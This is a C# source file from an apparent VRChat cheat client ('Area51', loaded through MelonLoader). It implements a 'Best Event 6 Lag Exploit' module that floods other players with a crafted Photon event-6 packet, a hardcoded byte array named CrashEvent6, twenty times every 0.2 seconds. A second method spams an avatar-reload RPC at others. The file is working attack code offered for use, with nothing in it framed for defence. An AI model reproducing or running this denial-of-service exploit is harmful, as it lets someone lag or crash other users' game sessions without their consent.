using System.Collections;
using UnityEngine;
using VRC.SDKBase;
using System;
using Area51.SDK.Photon;
using Area51.SDK;
using ExitGames.Client.Photon;
using System.Threading;

namespace Area51.Module.Exploit
{
    internal class Test : BaseModule
    {
        public Test() : base("Event 6", "Best Event 6 Lag Exploit", Main.Instance.Eventexploitbutton, null, true, false) { }
        internal static bool StateCourtine = false;
        internal static bool State(bool State) => State;


        public override void OnEnable()
        {
            MelonLoader.MelonCoroutines.Start(Test_Deync());
        }

        public override void OnDisable()
        {
            MelonLoader.MelonCoroutines.Stop(Test_Deync());
        }

        private static readonly byte[] CrashEvent6 = new byte[] { 106, 159, 142, 10, 204, 1, 0, 0, 0, 36, 0, 58, 49, 56, 54, 65, 49, 47, 85, 115, 101, 114, 67, 97, 109, 101, 114, 97, 73, 110, 100, 105, 99, 97, 116, 111, 114, 47, 73, 110, 100, 105, 99, 97, 116, 111, 114, 14, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 10, 0, 84, 105, 109, 101, 114, 66, 108, 111, 111, 112, 0, 0, 0, 0, 4, 0, 0, 10 };


        IEnumerator Test_Deync()
        {
            while (toggled)
            {
                for (int i = 0; i < 20; i++)
                {
                    byte[] GetActorNumber = BitConverter.GetBytes(PlayerWrapper.LocalPlayer.GetActorNumber());
                    Buffer.BlockCopy(GetActorNumber, 0, CrashEvent6, 5, 4);
                    PhotonExtensions.OpRaiseEvent(6, CrashEvent6, new Photon.Realtime.RaiseEventOptions { field_Public_ReceiverGroup_0 = Photon.Realtime.ReceiverGroup.Others, field_Public_EventCaching_0 = Photon.Realtime.EventCaching.DoNotCache }, default);
                }
                yield return new WaitForSecondsRealtime(0.2f);
            }
            yield break;
        }









        public IEnumerator EventSixTest()
        {
       
                try
                {
                    var x = new Il2CppSystem.Int32();
                    x.m_value = 1;
                    var obj = x.BoxIl2CppObject();
                    var x2 = new Il2CppSystem.Int32();
                    x2.m_value = 1;
                    var obj22 = x2.BoxIl2CppObject();
                    var obj2 = new Il2CppSystem.Object(VRC.Player.prop_Player_0.gameObject.m_CachedPtr);
                    Networking.RPC(RPC.Destination.Others, VRCPlayer.field_Internal_Static_VRCPlayer_0.field_Internal_GameObject_0, "ReloadAvatarNetworkedRPC", new Il2CppSystem.Object[] { obj, obj22, obj2 });
                    System.Console.WriteLine("Stop Spamming");
            }
                catch { }
                yield return new WaitForFixedUpdate();
        
        }

        void Test3()
        {
         


            //byte[] uSpeakData = new byte[8];
            //var il2CppArray = new Il2CppStructArray<byte>(uSpeakData.Length);
            //for (var i = 0; i < uSpeakData.Length; i++)
            //{
            //    il2CppArray[i] = uSpeakData[i];
            //}
            //var __1 = il2CppArray.Cast<Il2CppSystem.Object>();
            //PhotonExtensions.OpRaiseEvent(1, __1, new Photon.Realtime.RaiseEventOptions
            //{
            //    field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
            //    field_Public_EventCaching_0 = EventCaching.DoNotCache,
            //}, default);

        }
    }
}
